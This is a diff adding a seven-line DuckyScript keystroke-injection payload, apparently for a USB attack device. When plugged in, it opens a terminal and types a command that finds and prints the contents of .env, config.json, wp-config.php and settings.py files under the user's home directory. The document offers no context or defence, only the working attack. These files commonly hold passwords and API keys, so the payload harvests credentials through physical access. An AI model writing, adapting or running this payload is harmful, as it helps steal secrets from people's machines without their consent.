@@ -1,0 +1,7 @@
+REM Print ENV and CONFIG information
+ATTACKMODE HID STORAGE
+DELAY 2000
+CTRL ALT t
+DELAY 1000
+STRING find ~/ -type f \( -name ".env" -o -name "config.json" -o -name "wp-config.php" -o -name "settings.py" \) -exec echo -e "\n=== File: {} ===" \; -exec cat {} \;
+ENTER
